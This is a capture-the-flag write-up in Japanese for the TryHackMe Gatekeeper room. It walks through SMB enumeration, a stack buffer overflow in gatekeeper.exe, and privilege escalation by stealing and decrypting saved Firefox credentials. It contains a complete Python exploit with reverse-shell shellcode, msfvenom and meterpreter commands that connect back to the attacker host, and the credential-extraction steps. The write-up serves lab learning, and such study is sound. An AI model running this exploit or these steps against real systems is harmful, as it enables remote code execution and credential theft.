# Gatekeeper CTF

https://tryhackme.com/room/gatekeeper

## Enumeration

```shell
TARGET=10.201.33.204
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
31337/tcp open  Elite         syn-ack ttl 125
49152/tcp open  unknown       syn-ack ttl 125
49153/tcp open  unknown       syn-ack ttl 125
49154/tcp open  unknown       syn-ack ttl 125
49155/tcp open  unknown       syn-ack ttl 125
49161/tcp open  unknown       syn-ack ttl 125
49165/tcp open  unknown       syn-ack ttl 125
```

```sh
$ sudo nmap -sV -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49165 $TARGET

PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
31337/tcp open  Elite?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49161/tcp open  msrpc          Microsoft Windows RPC
49165/tcp open  msrpc          Microsoft Windows RPC
```

SMBなど。  
31337はターゲットのサービスか？

### SMB

Users 共有を発見。

```sh
$ smbclient -L //$TARGET -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.33.204 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Users の中で、gatekeeper.exe を発見。

```sh
$ smbclient //$TARGET/Users -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri May 15 10:57:08 2020
  ..                                 DR        0  Fri May 15 10:57:08 2020
  Default                           DHR        0  Tue Jul 14 16:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 13:54:24 2009
  Share                               D        0  Fri May 15 10:58:07 2020

                7863807 blocks of size 4096. 3878919 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Fri May 15 10:58:07 2020
  ..                                  D        0  Fri May 15 10:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 14:27:17 2020
```

## リバース

```c
undefined4 __cdecl FUN_080416f0(undefined4 param_1)
{
  undefined4 uVar1;
  char local_98;
  undefined1 auStack_97 [127];
  int local_18;
  undefined1 *local_14;
  int local_10;
  char *local_c;
  char local_5;
  
  FUN_08041100(&local_98,s_Hello_%s!!!_080441f0);
  local_c = &local_98;
  local_14 = auStack_97;
  do {
    local_5 = *local_c;
    local_c = local_c + 1;
  } while (local_5 != '\0');
  local_18 = (int)local_c - (int)local_14;
  local_10 = Ordinal_19(param_1,&local_98,local_18,0);
  if (local_10 == -1) {
    Ordinal_111();
    FUN_08041040(s_send_failed:_%d_08044200);
    Ordinal_3(param_1);
    uVar1 = 0xffffffff;
  }
  else {
    FUN_08041040(s_Bytes_sent:_%d_08044214);
    uVar1 = 0;
  }
  return uVar1;
}
```

パターン文字列を送って例外を発生させる。

```sh
$ nc localhost 31337
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

```sh
$ wine ./gatekeeper.exe
[+] Listening for connections.
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 201
send failed: 10038
wine: Unhandled page fault on read access to 616D6261 at address 616D6261 (thread 010c), starting debugger...
Unhandled exception: page fault on read access to 0x616d6261 in wow64 32-bit code (0x616d6261).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:616d6261 ESP:00c819d0 EBP:616c6261 EFLAGS:00010286(  R- --  I S - -P- )
 EAX:ffffffff EBX:00454680 ECX:00000008 EDX:00000008
 ESI:00950688 EDI:00000000
Stack dump:
0x00c819d0:  616e6261 616f6261 61706261 61716261
0x00c819e0:  61726261 61736261 61746261 61756261
0x00c819f0:  61766261 61776261 61786261 61796261
0x00c81a00:  21216261 61000a21 6161616d 6161616e
0x00c81a10:  6161616f 61616170 61616171 61616172
0x00c81a20:  61616173 61616174 61616175 61616176
Backtrace:
=>0 0x616d6261 (0x616c6261)
0x616d6261: -- no code accessible --
```


`EIP 0x616d6261 -> abma` は、147文字目。

JMP ESP を検索

```sh
!mona jmp -r esp -cpb "\x00"
```

```sh
0BADF00D   [+] Results :
080414C3     0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (D:\vmware\share\gatekeeper.exe), 0x8000
080416BF     0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (D:\vmware\share\gatekeeper.exe), 0x8000
0BADF00D       Found a total of 2 pointers
```

シェルコードを出力。badcharに`\x0a = LF` を入れないとうまくいかなかった。

```sh
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.146.32 LPORT=6666 -b "\x00\x0a" -f python
```

エクスプロイト

```python
import socket

ip="10.201.33.204"
port=31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))

# ダミー
buf =  b"A" * 146

# JMP ESP
# 0x080414c3
buf += b"\xc3\x14\x04\x08"

# シェルコード
## NOP
buf += b"\x90" * 20
## リバースシェル
buf += b"\xda\xcd\xbb\x38\x97\xaf\x8e\xd9\x74\x24\xf4\x58"
buf += b"\x29\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\xf8"
buf += b"\x93\x4d\x7b\x04\x73\x13\x84\xf4\x84\x74\x0c\x11"
buf += b"\xb5\xb4\x6a\x52\xe6\x04\xf8\x36\x0b\xee\xac\xa2"
buf += b"\x98\x82\x78\xc5\x29\x28\x5f\xe8\xaa\x01\xa3\x6b"
buf += b"\x29\x58\xf0\x4b\x10\x93\x05\x8a\x55\xce\xe4\xde"
buf += b"\x0e\x84\x5b\xce\x3b\xd0\x67\x65\x77\xf4\xef\x9a"
buf += b"\xc0\xf7\xde\x0d\x5a\xae\xc0\xac\x8f\xda\x48\xb6"
buf += b"\xcc\xe7\x03\x4d\x26\x93\x95\x87\x76\x5c\x39\xe6"
buf += b"\xb6\xaf\x43\x2f\x70\x50\x36\x59\x82\xed\x41\x9e"
buf += b"\xf8\x29\xc7\x04\x5a\xb9\x7f\xe0\x5a\x6e\x19\x63"
buf += b"\x50\xdb\x6d\x2b\x75\xda\xa2\x40\x81\x57\x45\x86"
buf += b"\x03\x23\x62\x02\x4f\xf7\x0b\x13\x35\x56\x33\x43"
buf += b"\x96\x07\x91\x08\x3b\x53\xa8\x53\x54\x90\x81\x6b"
buf += b"\xa4\xbe\x92\x18\x96\x61\x09\xb6\x9a\xea\x97\x41"
buf += b"\xdc\xc0\x60\xdd\x23\xeb\x90\xf4\xe7\xbf\xc0\x6e"
buf += b"\xc1\xbf\x8a\x6e\xee\x15\x1c\x3e\x40\xc6\xdd\xee"
buf += b"\x20\xb6\xb5\xe4\xae\xe9\xa6\x07\x65\x82\x4d\xf2"
buf += b"\xee\xa7\x9a\x6e\xce\xdf\x9e\x8e\x15\x2a\x16\x68"
buf += b"\x43\x3a\x7e\x23\xfc\xa3\xdb\xbf\x9d\x2c\xf6\xba"
buf += b"\x9e\xa7\xf5\x3b\x50\x40\x73\x2f\x05\xa0\xce\x0d"
buf += b"\x80\xbf\xe4\x39\x4e\x2d\x63\xb9\x19\x4e\x3c\xee"
buf += b"\x4e\xa0\x35\x7a\x63\x9b\xef\x98\x7e\x7d\xd7\x18"
buf += b"\xa5\xbe\xd6\xa1\x28\xfa\xfc\xb1\xf4\x03\xb9\xe5"
buf += b"\xa8\x55\x17\x53\x0f\x0c\xd9\x0d\xd9\xe3\xb3\xd9"
buf += b"\x9c\xcf\x03\x9f\xa0\x05\xf2\x7f\x10\xf0\x43\x80"
buf += b"\x9d\x94\x43\xf9\xc3\x04\xab\xd0\x47\x34\xe6\x78"
buf += b"\xe1\xdd\xaf\xe9\xb3\x83\x4f\xc4\xf0\xbd\xd3\xec"
buf += b"\x88\x39\xcb\x85\x8d\x06\x4b\x76\xfc\x17\x3e\x78"
buf += b"\x53\x17\x6b"

s.send(buf + b"\r\n")
s.recv(1024)
```

リバースシェル取得成功。

```sh
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.33.204] 49208
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat
```

## 権限昇格

使えそうな権限はない。

```sh
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Firefox が存在していることが分かる。

```sh
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,887,548,416 bytes free
```

`%APPDATA%\Mozilla\Firefox\Profiles\` に設定が保存されている。

```sh
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

04/21/2020  05:00 PM    <DIR>          .
04/21/2020  05:00 PM    <DIR>          ..
05/14/2020  10:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  05:00 PM    <DIR>          rajfzh3y.default
               0 File(s)              0 bytes
               4 Dir(s)  15,887,548,416 bytes free
```

フォルダをダウンロードするために、meterpreterに切り替える。

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.146.32 LPORT=7777 -f exe > test.exe

msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.11.146.32; set LPORT 7777;exploit"
```

フォルダごとダウンロード

```sh
meterpreter > pwd
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles
meterpreter > download ljfn812a.default-release
```

firefox_decrypt で読むと、mayorのパスワードが出てきた。

```sh
$ ./firefox_decrypt.py ../ljfn812a.default-release 
2025-10-15 10:48:09,526 - WARNING - profile.ini not found in ../ljfn812a.default-release
2025-10-15 10:48:09,526 - WARNING - Continuing and assuming '../ljfn812a.default-release' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '[REDACTED]'
```

psexecを試したが、無反応になりうまくいかなかった。

```sh
c:\Users\natbat\Desktop>psexec -accepteula -u mayor -p [REDACTED] -i cmd.exe
psexec -accepteula -u mayor -p [REDACTED] -i cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com
```

SMBでmayorとしてCドライブに接続。mayorのデスクトップに移動してrootフラグ入手できた。

```sh
$ smbclient //10.201.112.231/C$ -U "mayor" 
Password for [WORKGROUP\mayor]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Apr 22 05:56:54 2020
  Boot                              DHS        0  Mon Apr 20 04:51:20 2020
  bootmgr                          AHSR   383786  Sun Nov 21 12:23:51 2010
  BOOTSECT.BAK                     AHSR     8192  Mon Apr 20 04:51:20 2020
  Documents and Settings          DHSrn        0  Tue Jul 14 14:08:56 2009
  hiberfil.sys                     AHSn 804999168  Wed Oct 15 10:00:31 2025
  pagefile.sys                      AHS 1073741824  Wed Oct 15 10:00:45 2025
  PerfLogs                            D        0  Tue Jul 14 12:20:08 2009
  Program Files                      DR        0  Mon Apr 20 14:16:22 2020
  Program Files (x86)                DR        0  Wed Apr 22 11:45:02 2020
  ProgramData                       DHn        0  Sat May 16 06:40:33 2020
  Recovery                         DHSn        0  Mon Apr 20 00:55:25 2020
  System Volume Information         DHS        0  Wed Oct 15 10:47:31 2025
  Users                              DR        0  Fri May 15 10:57:08 2020
  Windows                             D        0  Sat May 16 06:41:18 2020
```

## 振り返り

- バッファオーバーフロー部分は Brainstorm とほぼ同じ。BadCharに "\0a" を入れないとうまくいかない点は異なっていた。基本的には入れておくほうが無難だと思われる。
- Windows で Firefox のプロファイルを読むパターンは初めてだった。
- Windows10より前では、Powershellが使えなければフォルダを圧縮するのが簡単ではない。
